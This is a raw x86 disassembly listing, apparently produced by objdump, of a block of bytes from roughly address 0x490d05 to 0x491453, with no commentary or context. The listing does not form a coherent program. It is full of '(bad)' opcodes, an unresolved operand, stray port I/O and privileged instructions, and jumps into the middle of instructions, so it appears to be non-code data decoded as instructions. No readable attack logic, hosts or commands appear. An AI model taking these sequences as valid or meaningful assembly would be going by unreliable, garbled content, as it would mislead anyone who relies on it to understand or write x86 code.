  490d05:	ins    DWORD PTR es:[edi],dx
  490d06:	pop    ss
  490d07:	pop    edi
  490d08:	dec    edi
  490d09:	dec    ebp
  490d0a:	mov    DWORD PTR [ecx+0x55],esp
  490d0d:	xlat   BYTE PTR ds:[ebx]
  490d0e:	maskmovq mm0,(bad)
  490d0f:	test   DWORD PTR [edx+ebp*2+0x270280e0],0x25d84561
  490d1a:	jae    0x490d7b
  490d1c:	push   ss
  490d1d:	adc    eax,0x47af7416
  490d22:	lea    ebx,[ebx+0x63]
  490d25:	xor    bl,bh
  490d27:	mov    edi,0x3035ba90
  490d2c:	iret   
  490d2d:	xor    cl,bh
  490d2f:	or     ch,BYTE PTR [esi+ecx*1-0x75]
  490d33:	outs   dx,DWORD PTR ds:[esi]
  490d34:	rcl    DWORD PTR [edi+0x23b9dabf],cl
  490d3a:	test   ebx,edi
  490d3c:	ja     0x490d20
  490d3e:	dec    edi
  490d3f:	push   ss
  490d40:	xlat   BYTE PTR ds:[ebx]
  490d41:	sub    ch,0x45
  490d44:	(bad)  
  490d45:	mov    edi,0x95a7853f
  490d4a:	xchg   BYTE PTR [edi+0x77],bl
  490d4d:	sbb    eax,0xb7b54216
  490d52:	sbb    BYTE PTR [bx+di],dl
  490d55:	or     DWORD PTR [edx-0x21],ebx
  490d58:	(bad)  
  490d59:	(bad)  
  490d5a:	add    DWORD PTR [ebx+edi*1],esp
  490d5d:	inc    DWORD PTR [ebx]
  490d5f:	int    0x5a
  490d61:	add    ecx,DWORD PTR [esi-0x54d890a5]
  490d67:	xor    DWORD PTR [ecx+0x5d],0x6b87c731
  490d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490d6f:	mov    dh,0x44
  490d71:	and    ebp,DWORD PTR [edi]
  490d73:	(bad)  
  490d74:	sar    BYTE PTR [esi+0xfc70b16],1
  490d7a:	aaa    
  490d7b:	pop    eax
  490d7c:	add    esp,DWORD PTR [ecx-0x5228104b]
  490d82:	sub    edx,DWORD PTR [ecx]
  490d84:	sub    edi,0x3f
  490d87:	dec    eax
  490d88:	sbb    al,0x15
  490d8a:	push   ss
  490d8b:	scas   eax,DWORD PTR es:[edi]
  490d8c:	dec    edi
  490d8d:	xor    eax,DWORD PTR ds:0x97a5561e
  490d93:	mov    esi,edi
  490d95:	ins    BYTE PTR es:[edi],dx
  490d96:	pop    ebp
  490d97:	xor    al,0x6
  490d99:	ja     0x490e12
  490d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490d9c:	cs pop esp
  490d9e:	test   BYTE PTR [edi+0x33],al
  490da1:	lfs    eax,FWORD PTR [esi]
  490da4:	adc    DWORD PTR ds:0x1a823527,esp
  490daa:	sbb    al,0xc7
  490dac:	das    
  490dad:	sub    ebp,0x4763a382
  490db3:	inc    ebx
  490db4:	mov    DWORD PTR [ebx],0x75b4a07
  490dba:	fistp  WORD PTR [edi-0x74f5cf97]
  490dc0:	pop    es
  490dc1:	aaa    
  490dc2:	aaa    
  490dc3:	push   ss
  490dc4:	fist   DWORD PTR [esi-0x69]
  490dc7:	outs   dx,DWORD PTR ds:[esi]
  490dc8:	xchg   edi,esi
  490dca:	leave  
  490dcb:	adc    DWORD PTR ds:0x319f4760,0xfffffff4
  490dd2:	cs (bad) 
  490dd4:	test   al,0x8f
  490dd6:	nop    DWORD PTR [edi+0x8]
  490dda:	adc    ch,BYTE PTR [ebx-0x4ccdf081]
  490de0:	je     0x490d92
  490de2:	or     DWORD PTR [edi+0x17],edi
  490de5:	jg     0x490e0e
  490de7:	lock test BYTE PTR [ebp+0x17],ch
  490deb:	mov    edi,0xee0ac4d7
  490df0:	pop    eax
  490df1:	pop    edi
  490df2:	xor    ebp,DWORD PTR [edi+0x4a830a5c]
  490df8:	scas   eax,DWORD PTR es:[edi]
  490df9:	rcl    edx,cl
  490dfb:	inc    edx
  490dfc:	call   0xf81ff533
  490e01:	add    BYTE PTR [edi],dh
  490e03:	loopne 0x490e32
  490e05:	out    dx,eax
  490e06:	test   DWORD PTR [edi+0x45],0xb6de326d
  490e0d:	addr16 daa 
  490e0f:	test   DWORD PTR [edi+0x51],0x53c21cb4
  490e16:	push   ss
  490e17:	xor    bh,BYTE PTR [edi-0x80]
  490e1a:	mov    ch,0x38
  490e1c:	mov    al,ds:0x5e1095a7
  490e21:	sub    esi,DWORD PTR [edi+0x5685178a]
  490e27:	add    BYTE PTR [ecx-0x51],ch
  490e2a:	imul   DWORD PTR [ecx+0x2fd00d2c]
  490e30:	pop    edi
  490e31:	inc    edx
  490e32:	jge    0x490e94
  490e34:	xchg   DWORD PTR [ebx+0x7],ebx
  490e37:	xlat   BYTE PTR ds:[ebx]
  490e38:	push   0x1fb05bc1
  490e3d:	cmp    eax,DWORD PTR [edi-0x7d]
  490e40:	dec    ebp
  490e41:	xchg   BYTE PTR [esi-0x79],dl
  490e44:	add    esp,edi
  490e46:	add    al,dl
  490e48:	mov    bh,0xa2
  490e4a:	daa    
  490e4b:	mov    ds:0x3ac0933,eax
  490e50:	mov    DWORD PTR [edi-0x4b782a29],ebx
  490e56:	sub    BYTE PTR [edi],cl
  490e58:	push   edi
  490e59:	(bad)  
  490e5a:	push   eax
  490e5b:	add    BYTE PTR [ebp+0x30],0x41
  490e5f:	jg     0x490e70
  490e61:	mov    dh,0xad
  490e63:	dec    edx
  490e64:	cmp    al,0x37
  490e66:	inc    esp
  490e67:	aas    
  490e68:	dec    edi
  490e69:	jg     0x490e88
  490e6b:	fistp  DWORD PTR [ebx-0x3b]
  490e6e:	pop    ss
  490e6f:	scas   eax,DWORD PTR es:[edi]
  490e70:	out    dx,eax
  490e71:	jg     0x490e10
  490e73:	mov    dh,0x52
  490e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490e76:	(bad)  
  490e77:	xchg   ebx,eax
  490e78:	ss pusha 
  490e7a:	fild   DWORD PTR [eax-0x5240c819]
  490e80:	ins    DWORD PTR es:[edi],dx
  490e81:	sbb    eax,esi
  490e83:	dec    edi
  490e84:	(bad)  
  490e86:	das    
  490e87:	bound  esp,QWORD PTR [edx]
  490e89:	xchg   ecx,eax
  490e8a:	inc    esi
  490e8b:	scas   eax,DWORD PTR es:[edi]
  490e8c:	addr16 inc edx
  490e8e:	pop    ss
  490e8f:	pop    eax
  490e90:	rol    DWORD PTR [edi],0xc7
  490e93:	and    eax,0x330a9075
  490e98:	mov    edi,0x549b60e7
  490e9d:	arpl   si,bp
  490e9f:	cmp    BYTE PTR [edi],ch
  490ea1:	mov    ch,0xb9
  490ea3:	and    eax,0x316f1adf
  490ea8:	jae    0x490f19
  490eaa:	push   eax
  490eab:	call   0xb2e2:0x2f8f3748
  490eb2:	mov    esi,0x38e36f6d
  490eb7:	fistp  WORD PTR [eax-0x4f]
  490eba:	mov    dl,BYTE PTR [edi+ecx*8+0x7f]
  490ebe:	pop    eax
  490ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490ec0:	or     ch,0x23
  490ec3:	outs   dx,DWORD PTR ds:[esi]
  490ec4:	add    dl,BYTE PTR [eax+0x58]
  490ec7:	add    eax,0xede14397
  490ecc:	push   esp
  490ecd:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  490ecf:	div    DWORD PTR [edi+0x78]
  490ed2:	imul   ecx,DWORD PTR [ebx-0x72],0x172f3137
  490ed9:	adc    BYTE PTR [eax],ah
  490edb:	je     0x490ea8
  490edd:	out    0xcf,eax
  490edf:	push   edx
  490ee0:	enter  0x8155,0x57
  490ee4:	cmp    BYTE PTR [ecx],ah
  490ee6:	push   ss
  490ee7:	xchg   esp,eax
  490ee8:	push   ss
  490ee9:	out    dx,eax
  490eea:	pop    ds
  490eeb:	xchg   ebx,eax
  490eec:	mov    ch,0x52
  490eee:	pop    eax
  490eef:	(bad)  
  490ef0:	lahf   
  490ef1:	ins    BYTE PTR es:[edi],dx
  490ef2:	je     0x490e7f
  490ef4:	pop    eax
  490ef5:	not    DWORD PTR [edi+0x58]
  490ef8:	xchg   ebp,eax
  490ef9:	or     DWORD PTR [edi-0x775bc845],0x52e7144b
  490f03:	push   ebp
  490f04:	mov    eax,0x4777aad6
  490f09:	addr16 ss inc ecx
  490f0c:	dec    eax
  490f0d:	sub    al,0x67
  490f0f:	push   edi
  490f10:	add    ebp,ebx
  490f12:	adc    ah,dh
  490f14:	xchg   edi,eax
  490f15:	pop    ds
  490f16:	add    bl,BYTE PTR [esi]
  490f18:	mov    cl,0x2a
  490f1a:	(bad)  
  490f1b:	xor    ecx,esp
  490f1d:	and    BYTE PTR [esi+0x37341b59],0xe
  490f24:	adc    DWORD PTR [ecx-0x3f1818b6],esp
  490f2a:	je     0x490eb4
  490f2c:	mov    eax,0x1c37df39
  490f31:	sub    BYTE PTR [ebp+0x48],dl
  490f34:	das    
  490f35:	dec    ebx
  490f36:	xor    DWORD PTR ss:[edx],ecx
  490f39:	ins    BYTE PTR es:[edi],dx
  490f3a:	xchg   edi,eax
  490f3b:	push   esi
  490f3c:	xchg   ebx,eax
  490f3d:	mov    al,ds:0x87316f23
  490f42:	add    DWORD PTR [esp+ebp*2],ecx
  490f45:	and    bh,bh
  490f47:	dec    edi
  490f48:	add    DWORD PTR [esi],esp
  490f4a:	pop    es
  490f4b:	pop    ebx
  490f4c:	aaa    
  490f4d:	aaa    
  490f4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490f4f:	xchg   esi,eax
  490f50:	mov    dh,0x11
  490f52:	pusha  
  490f53:	xchg   edi,eax
  490f54:	pop    ds
  490f55:	stos   BYTE PTR es:[edi],al
  490f56:	dec    ebx
  490f57:	test   eax,0x52d7c75d
  490f5c:	ja     0x490f03
  490f5e:	mov    DWORD PTR [ebp-0x25],edx
  490f61:	cmova  ecx,DWORD PTR [edi+0x188d712a]
  490f68:	(bad)  
  490f69:	aaa    
  490f6a:	pop    es
  490f6b:	or     eax,0xaf95c236
  490f70:	jg     0x490fce
  490f72:	add    al,0x6b
  490f74:	pop    eax
  490f75:	scas   eax,DWORD PTR es:[edi]
  490f76:	jg     0x490fa9
  490f78:	sub    BYTE PTR [ebx+0x4],0xb0
  490f7c:	aas    
  490f7d:	inc    edx
  490f7e:	pop    ds
  490f7f:	cwde   
  490f80:	jp     0x490ffa
  490f82:	aaa    
  490f83:	scas   al,BYTE PTR es:[edi]
  490f84:	ja     0x490f2d
  490f86:	inc    ebx
  490f87:	adc    eax,DWORD PTR [ecx-0x54]
  490f8a:	xchg   edi,edi
  490f8c:	xor    al,0x68
  490f8e:	ret    0x4b4e
  490f91:	xchg   DWORD PTR [edi+0x60],ebp
  490f94:	xor    ch,BYTE PTR [ebp+0x6d]
  490f97:	inc    ebp
  490f98:	jmp    FWORD PTR [edi]
  490f9a:	inc    ebp
  490f9b:	inc    esi
  490f9c:	repnz ins DWORD PTR es:[edi],dx
  490f9e:	shr    BYTE PTR [esi+0x5c427f3f],0xc2
  490fa5:	mov    al,ds:0x1af72f02
  490faa:	adc    BYTE PTR [eax],cl
  490fac:	pop    eax
  490fad:	aaa    
  490fae:	(bad)  
  490fb0:	sbb    ebx,DWORD PTR ss:[edi]
  490fb3:	daa    
  490fb4:	lahf   
  490fb5:	dec    ebx
  490fb6:	sti    
  490fb7:	les    ebp,FWORD PTR [eax-0x71]
  490fba:	mov    edi,0x6c0532fe
  490fbf:	sbb    DWORD PTR [eax],0xffffffc7
  490fc2:	mov    bh,0x3
  490fc4:	adc    DWORD PTR [edi],ecx
  490fc6:	retf   0xefbf
  490fc9:	jle    0x490fe1
  490fcb:	add    DWORD PTR [ecx],edx
  490fcd:	xchg   edx,eax
  490fce:	cmp    edi,esp
  490fd0:	mov    dl,0x58
  490fd2:	adc    al,0x1b
  490fd4:	fisttp WORD PTR [edi]
  490fd6:	aaa    
  490fd7:	xchg   dh,dl
  490fd9:	sbb    DWORD PTR [ebp-0x65],0x6365d86f
  490fe0:	aad    0x67
  490fe2:	(bad)  
  490fe3:	es pusha 
  490fe5:	mov    cl,0xc7
  490fe7:	das    
  490fe8:	inc    ebp
  490fe9:	jg     0x490fba
  490feb:	push   ds
  490fec:	outs   dx,BYTE PTR ds:[esi]
  490fed:	adc    esp,ebx
  490fef:	mov    BYTE PTR [edi],0x53
  490ff2:	rcl    BYTE PTR [ecx-0x70d5cf34],cl
  490ff8:	aas    
  490ff9:	aaa    
  490ffa:	fidiv  DWORD PTR [eax]
  490ffc:	and    BYTE PTR [edx+0x56372fc6],bh
  491002:	or     al,0xac
  491004:	cdq    
  491005:	pop    ss
  491006:	inc    DWORD PTR [ebp-0x2c]
  491009:	dec    eax
  49100a:	adc    DWORD PTR [esi-0x4eb8bdce],edi
  491010:	sbb    cl,BYTE PTR [esi+0xa]
  491013:	loop   0x490fd4
  491015:	test   eax,0x7f87c212
  49101a:	jg     0x49102d
  49101c:	pop    eax
  49101d:	mov    eax,ds:0x15af1a56
  491022:	sub    ah,BYTE PTR [eax-0x53]
  491025:	das    
  491026:	out    dx,eax
  491027:	push   0x2756040d
  49102c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49102d:	sub    eax,0xdf7428b0
  491032:	xchg   edi,eax
  491033:	iret   
  491034:	inc    ecx
  491035:	jl     0x49109a
  491037:	xchg   ebx,eax
  491038:	and    ch,BYTE PTR [edi]
  49103a:	ja     0x49104f
  49103c:	rol    ch,0xe
  49103f:	pop    edi
  491040:	inc    edi
  491041:	jbe    0x491023
  491043:	dec    ecx
  491044:	mov    edi,edx
  491046:	push   edi
  491047:	pop    es
  491048:	pop    es
  491049:	out    dx,eax
  49104a:	ins    DWORD PTR es:[edi],dx
  49104b:	add    al,0x5f
  49104d:	test   DWORD PTR [ebx],0x256b07f
  491053:	pop    es
  491054:	dec    edi
  491055:	xlat   BYTE PTR ds:[ebx]
  491056:	push   ebp
  491057:	leave  
  491058:	shr    BYTE PTR [edx+0x2107c7b7],0x90
  49105f:	retf   0x4430
  491062:	pop    es
  491063:	mov    cl,BYTE PTR [ecx]
  491065:	loop   0x4910b9
  491067:	das    
  491068:	aaa    
  491069:	or     DWORD PTR [esi],0xffffffae
  49106c:	adc    BYTE PTR [edi+0x7f],ah
  49106f:	push   edi
  491070:	or     al,0x40
  491072:	sub    al,dl
  491074:	test   DWORD PTR [edi-0x30],0xff63011a
  49107b:	imul   ecx,DWORD PTR [eax],0xe674b83
  491081:	fnstcw WORD PTR [eax-0x686130ab]
  491087:	add    BYTE PTR [eax],bl
  491089:	and    eax,0x76b01f94
  49108e:	pusha  
  49108f:	mov    ecx,0x61ef4237
  491094:	aam    0x56
  491096:	stos   BYTE PTR es:[edi],al
  491097:	pop    es
  491098:	(bad)  
  491099:	or     esi,edx
  49109b:	xor    BYTE PTR ds:0xae16876f,0x40
  4910a2:	test   eax,0x5642877f
  4910a7:	pop    edx
  4910a8:	mov    eax,ds:0x6aa717d3
  4910ad:	sub    eax,0x670f8a41
  4910b2:	inc    edi
  4910b3:	lods   eax,DWORD PTR ds:[esi]
  4910b4:	sbb    dl,al
  4910b6:	and    dh,bh
  4910b8:	pop    ss
  4910b9:	adc    eax,0xff2ea40c
  4910be:	inc    edi
  4910bf:	fcmovnb st,st(2)
  4910c1:	pop    ebp
  4910c2:	pop    eax
  4910c3:	out    dx,eax
  4910c4:	or     al,BYTE PTR ss:[ebp+ebp*1-0x30e060ef]
  4910cc:	adc    eax,0x5f581b16
  4910d1:	cmp    BYTE PTR [edi],bl
  4910d3:	retf   
  4910d4:	bound  edx,QWORD PTR ds:0xbfd75aa4
  4910da:	dec    ecx
  4910db:	push   ebx
  4910dc:	lods   eax,DWORD PTR ds:[esi]
  4910dd:	jne    0x49107e
  4910df:	data16 aaa 
  4910e1:	aaa    
  4910e2:	cdq    
  4910e3:	sub    eax,0xbf7f236a
  4910e8:	inc    edx
  4910e9:	and    esi,DWORD PTR [eax+0x3f310386]
  4910ef:	mov    ebx,0xda84049b
  4910f4:	jg     0x491165
  4910f6:	adc    cl,0x25
  4910f9:	or     BYTE PTR [edi],dl
  4910fb:	fisttp WORD PTR [esp+ecx*1]
  4910fe:	not    BYTE PTR [eax-0x27dde04d]
  491104:	push   esi
  491105:	mov    cl,0x87
  491107:	xchg   edi,eax
  491108:	dec    edi
  491109:	in     al,dx
  49110a:	mov    ds:0x447f3584,al
  49110f:	push   edi
  491110:	sbb    BYTE PTR [esi+edx*1],cl
  491113:	inc    esi
  491114:	pop    DWORD PTR [eax+0x61]
  491117:	push   ebp
  491118:	fimul  DWORD PTR [edi]
  49111a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49111b:	inc    ebp
  49111c:	xchg   edx,eax
  49111d:	stos   DWORD PTR es:[edi],eax
  49111e:	(bad)  
  49111f:	cmp    DWORD PTR [esi-0x654adf1e],ebx
  491125:	out    0x4f,eax
  491127:	inc    ebp
  491128:	jo     0x491172
  49112a:	pop    ebp
  49112b:	and    ah,BYTE PTR [edi]
  49112d:	mov    edi,0xc8588bad
  491132:	outs   dx,DWORD PTR ss:[esi]
  491134:	rcl    DWORD PTR [ecx],0x25
  491137:	or     BYTE PTR [edi],dh
  491139:	xor    al,0x67
  49113b:	xchg   esp,eax
  49113c:	or     DWORD PTR [edi+0x5a],0xb7c2368f
  491143:	adc    DWORD PTR [edx+0x616c1f27],esp
  491149:	adc    eax,0x12629788
  49114e:	mov    eax,0xdf375f0a
  491153:	mov    al,ds:0x8f096475
  491158:	ja     0x4910fa
  49115a:	adc    eax,0x77efda13
  49115f:	dec    ecx
  491160:	sahf   
  491161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491162:	rcr    bh,1
  491164:	div    BYTE PTR [edx+esi*1]
  491167:	adc    al,0xac
  491169:	dec    ebx
  49116a:	pop    ss
  49116b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49116c:	cmp    BYTE PTR ds:0xf71612eb,dl
  491172:	pop    es
  491173:	adc    BYTE PTR [esi],ch
  491175:	in     al,0x69
  491177:	(bad)  
  491178:	xor    ebp,DWORD PTR ss:[edx-0x40ae2dfc]
  49117f:	inc    ebx
  491180:	das    
  491181:	add    BYTE PTR [esi+eax*4+0x204f2797],ch
  491188:	xchg   esp,eax
  491189:	in     al,0x83
  49118b:	outs   dx,DWORD PTR ds:[esi]
  49118c:	inc    edx
  49118d:	xor    al,0xda
  49118f:	les    esp,FWORD PTR [edx-0x19]
  491192:	lahf   
  491193:	adc    BYTE PTR [ecx+0x32],ch
  491196:	outs   dx,BYTE PTR ds:[esi]
  491197:	push   ds
  491198:	lahf   
  491199:	popa   
  49119a:	lea    eax,[edx-0x2dc8184f]
  4911a0:	xor    eax,0x278f440a
  4911a5:	xor    al,0xb
  4911a7:	inc    edx
  4911a8:	or     ch,BYTE PTR [edi]
  4911aa:	jg     0x49116c
  4911ac:	mov    edx,0x8bb76144
  4911b1:	push   0x8f678b31
  4911b6:	es xchg ebp,eax
  4911b8:	data16 or bl,BYTE PTR [esi]
  4911bb:	inc    esp
  4911bc:	xor    ch,BYTE PTR [ebp+0x171ac25d]
  4911c2:	pop    es
  4911c3:	mov    al,0x82
  4911c5:	enter  0x5fd5,0x42
  4911c9:	lahf   
  4911ca:	adc    edx,ebx
  4911cc:	ret    0x7f33
  4911cf:	out    0x0,eax
  4911d1:	or     eax,0x378f2daa
  4911d6:	cmp    cl,BYTE PTR [ecx]
  4911d8:	loope  0x491204
  4911da:	daa    
  4911db:	inc    ecx
  4911dc:	mov    bh,0xb9
  4911de:	fadd   DWORD PTR [ebx+0x372fcfb5]
  4911e4:	in     eax,0x13
  4911e6:	push   ss
  4911e7:	imul   edi,DWORD PTR [edi],0x422433ef
  4911ed:	aaa    
  4911ee:	mov    eax,ds:0xa3a0c0a7
  4911f3:	rcl    BYTE PTR [edi+0x30],cl
  4911f6:	iret   
  4911f7:	data16 adc BYTE PTR [edi-0x3f],al
  4911fb:	xor    DWORD PTR [edi+0xa85cb44],ebx
  491201:	pop    ebx
  491202:	cwde   
  491203:	xor    BYTE PTR [edi],bh
  491205:	(bad)  
  491206:	and    DWORD PTR [ebx],ebp
  491208:	adc    edi,edx
  49120a:	mov    edi,0xb758930e
  49120f:	pop    edi
  491210:	pop    ss
  491211:	push   edx
  491212:	sbb    al,0x80
  491214:	mov    ?,WORD PTR [eax]
  491216:	inc    DWORD PTR [edi-0x7841554f]
  49121c:	pop    ds
  49121d:	jmp    0x4911a5
  49121f:	jbe    0x49124d
  491221:	ror    BYTE PTR [edi+0xf],cl
  491224:	mov    ch,0x0
  491226:	stos   DWORD PTR es:[edi],eax
  491227:	in     eax,dx
  491228:	dec    edi
  491229:	pop    edi
  49122a:	ja     0x49120f
  49122c:	mov    al,ds:0x8f670752
  491231:	imul   ebx,ebp,0x9f4392d4
  491237:	in     eax,0x8a
  491239:	push   esi
  49123a:	or     eax,0x4a34ef7f
  49123f:	aaa    
  491240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491242:	das    
  491243:	inc    ecx
  491244:	fisttp WORD PTR [ecx+0x7e]
  491247:	adc    DWORD PTR [ecx+0x47],ebp
  49124a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49124b:	cmp    DWORD PTR ds:0xf718ae36,eax
  491251:	inc    edx
  491252:	push   ebx
  491253:	inc    ecx
  491254:	inc    ecx
  491255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491256:	and    esp,DWORD PTR [edi]
  491258:	inc    edi
  491259:	jno    0x491298
  49125b:	scas   al,BYTE PTR es:[edi]
  49125c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49125d:	xor    esi,DWORD PTR [edx-0x49]
  491260:	xchg   edx,eax
  491261:	je     0x491253
  491263:	mov    dh,0x4f
  491265:	retf   
  491266:	xchg   edi,eax
  491267:	sub    eax,0x87eb0b1c
  49126c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49126d:	shl    DWORD PTR [ebx+0x57d7a752],0x67
  491274:	mov    cl,BYTE PTR [eax+0x3c]
  491277:	adc    cl,BYTE PTR [esi+0x12321a67]
  49127d:	inc    edi
  49127e:	daa    
  49127f:	adc    al,0x49
  491281:	les    eax,FWORD PTR [edx+0x6e178f47]
  491287:	xor    al,0x1d
  491289:	cmp    DWORD PTR [edi-0x32f41032],ecx
  49128f:	push   es
  491290:	push   esi
  491291:	pop    ss
  491292:	imul   edx,DWORD PTR [edx+0x2a],0xffffffc2
  491296:	and    dh,cl
  491298:	addr16 push cs
  49129a:	or     dh,BYTE PTR [ebp+ecx*1+0x403ef70f]
  4912a1:	stos   DWORD PTR es:[edi],eax
  4912a2:	rcl    DWORD PTR [eax],0xc7
  4912a5:	lods   al,BYTE PTR ds:[esi]
  4912a6:	and    ch,BYTE PTR [edx+eax*2+0x48553fd7]
  4912ad:	or     BYTE PTR [ebx],ah
  4912af:	fdivrp st(7),st
  4912b1:	pop    es
  4912b2:	rcl    BYTE PTR [edx-0x80],cl
  4912b5:	inc    edi
  4912b6:	(bad)  
  4912b7:	ja     0x4912c0
  4912b9:	dec    eax
  4912ba:	enter  0x3815,0x77
  4912be:	loopne 0x4912c5
  4912c0:	push   ss
  4912c1:	inc    ebp
  4912c2:	lahf   
  4912c3:	(bad)  
  4912c4:	xor    al,0x61
  4912c6:	test   BYTE PTR [eax+0x22045f64],ch
  4912cc:	ret    0xc741
  4912cf:	xor    al,0x77
  4912d1:	add    BYTE PTR [esi-0x6d],dl
  4912d4:	or     BYTE PTR [edi],bh
  4912d6:	nop
  4912d7:	xchg   BYTE PTR [ebp-0x6],al
  4912da:	xchg   edi,eax
  4912db:	neg    edi
  4912dd:	dec    edx
  4912de:	dec    ecx
  4912df:	xchg   ecx,eax
  4912e0:	push   cs
  4912e1:	dec    edi
  4912e2:	xchg   BYTE PTR [edx+0xc],al
  4912e5:	sbb    dl,BYTE PTR ds:0xb77737ab
  4912eb:	or     ebp,DWORD PTR [ebx]
  4912ed:	inc    esi
  4912ee:	sbb    BYTE PTR [esi],bl
  4912f0:	dec    edi
  4912f1:	jp     0x4912fb
  4912f3:	lods   eax,DWORD PTR ds:[esi]
  4912f4:	lods   eax,DWORD PTR ds:[esi]
  4912f5:	mov    edi,0xa243d797
  4912fa:	push   eax
  4912fb:	aad    0x28
  4912fd:	out    dx,eax
  4912fe:	out    dx,eax
  4912ff:	daa    
  491300:	out    0x60,eax
  491302:	pop    edx
  491303:	test   BYTE PTR [edx-0x69],ah
  491306:	xor    BYTE PTR [ecx],dh
  491308:	add    al,0xab
  49130a:	add    cl,BYTE PTR [edi-0x6a1bcc69]
  491310:	loop   0x491336
  491312:	lahf   
  491313:	xchg   ebx,eax
  491314:	test   BYTE PTR [esi+0xf775561],ch
  49131a:	xor    bl,BYTE PTR [eax+ebx*2]
  49131d:	inc    edi
  49131e:	push   0x67
  491320:	xlat   BYTE PTR ds:[ebx]
  491321:	arpl   WORD PTR [eax],bx
  491323:	jno    0x49132d
  491325:	mov    BYTE PTR [ecx-0x59],0x34
  491329:	xor    DWORD PTR [ebx+eax*1],0x1536436e
  491330:	or     esi,eax
  491332:	lds    ebp,FWORD PTR [edi+0x2aa48732]
  491338:	cmp    al,0x6b
  49133a:	inc    edi
  49133b:	and    al,BYTE PTR [bp+si]
  49133e:	xor    al,0x62
  491340:	scas   eax,DWORD PTR es:[edi]
  491341:	aas    
  491342:	add    DWORD PTR [eax+ebp*4+0x30fc6f30],ebp
  491349:	test   cl,al
  49134b:	ja     0x491344
  49134d:	cmp    ah,al
  49134f:	add    BYTE PTR [eax],ch
  491351:	test   bh,ah
  491353:	daa    
  491354:	sahf   
  491355:	adc    ah,BYTE PTR [eax+0x23]
  491358:	addr16 jg 0x49137f
  49135b:	loope  0x4912e9
  49135d:	inc    eax
  49135e:	jp     0x49136e
  491360:	and    BYTE PTR ds:0xcf374f0f,ah
  491366:	and    al,0xad
  491368:	or     edi,DWORD PTR [edx]
  49136a:	xor    DWORD PTR [edi-0x754e6ca0],ebp
  491370:	outs   dx,DWORD PTR ds:[esi]
  491371:	dec    edi
  491372:	or     al,dl
  491374:	push   esp
  491375:	ins    BYTE PTR es:[edi],dx
  491376:	lahf   
  491377:	aaa    
  491378:	push   edx
  491379:	xchg   edx,eax
  49137a:	add    esp,DWORD PTR [ebp-0x5dc7b141]
  491380:	mov    DWORD PTR es:[ebp+0x3f],ebx
  491384:	mul    DWORD PTR [ebp+eax*8-0x4530539f]
  49138b:	sbb    edx,eax
  49138d:	stos   BYTE PTR es:[edi],al
  49138e:	out    0xef,eax
  491390:	inc    ecx
  491391:	xor    al,0xeb
  491393:	sbb    BYTE PTR [edi-0x2110b4d9],cl
  491399:	(bad)  
  49139a:	push   eax
  49139b:	(bad)  [esi]
  49139d:	(bad)  
  49139f:	aas    
  4913a0:	or     al,BYTE PTR cs:[ebx]
  4913a3:	jns    0x491423
  4913a5:	inc    edx
  4913a6:	aas    
  4913a7:	sub    DWORD PTR [ebp+0x41ffc613],ebp
  4913ad:	test   BYTE PTR [esi+0x5d0f43d1],al
  4913b3:	pusha  
  4913b4:	add    eax,0xfbc7c7bb
  4913b9:	push   esp
  4913ba:	sbb    DWORD PTR [eax+0x65],ebx
  4913bd:	(bad)  
  4913bf:	sbb    al,0x5b
  4913c1:	mov    ds:0x670f3130,eax
  4913c6:	inc    ecx
  4913c7:	push   0x77052a62
  4913cc:	xor    eax,0x44a0bea1
  4913d1:	daa    
  4913d2:	imul   ebp,DWORD PTR [edi+0x4b],0xffffffa6
  4913d6:	stos   BYTE PTR es:[edi],al
  4913d7:	popa   
  4913d8:	(bad)  
  4913db:	add    esp,DWORD PTR [ecx]
  4913dd:	pusha  
  4913de:	(bad)  
  4913df:	out    0xba,eax
  4913e1:	sub    DWORD PTR [esp+esi*4],ecx
  4913e4:	pop    edx
  4913e5:	pop    edi
  4913e6:	add    ah,BYTE PTR [eax]
  4913e8:	les    esi,FWORD PTR [eax+0x6d31af0f]
  4913ee:	mov    esp,ss
  4913f0:	ja     0x491459
  4913f2:	xor    eax,0x82299303
  4913f7:	inc    DWORD PTR [ebp+0x30]
  4913fa:	push   0xa2f54b8
  4913ff:	xlat   BYTE PTR ds:[ebx]
  491400:	adc    DWORD PTR [edx+ebp*1-0x60c8382c],esp
  491407:	xchg   ecx,eax
  491408:	sbb    BYTE PTR [eax],ah
  49140a:	dec    esp
  49140b:	xor    BYTE PTR [edi-0x7aa36dec],al
  491411:	mov    bh,0x46
  491413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491414:	sub    eax,DWORD PTR [edx+0x6b]
  491417:	out    dx,eax
  491418:	jnp    0x49142a
  49141a:	cs push ss
  49141c:	inc    esi
  49141d:	pop    ds
  49141e:	inc    DWORD PTR [ebx+ecx*4-0x7f]
  491422:	jne    0x491450
  491424:	aaa    
  491425:	addr16 lahf 
  491427:	adc    BYTE PTR [edx+ebp*2],0x92
  49142b:	inc    esp
  49142c:	inc    esi
  49142d:	aas    
  49142e:	pop    edi
  49142f:	fld    QWORD PTR [esi+eax*1]
  491432:	rcl    DWORD PTR [edi-0x4fdc9e79],0x8e
  491439:	dec    edi
  49143a:	(bad)  
  49143b:	sbb    BYTE PTR [ecx-0x4f],al
  49143e:	or     ch,BYTE PTR [edi]
  491440:	lahf   
  491441:	mov    al,ds:0x72c3568
  491446:	jg     0x49148f
  491448:	push   esp
  491449:	mov    ah,0x46
  49144b:	and    al,0x8f
  49144d:	mov    bh,0x61
  49144f:	lods   eax,DWORD PTR ds:[esi]
  491450:	or     DWORD PTR [edx],0x57
  491453:	lds    ebx,FWORD PTR [edx]
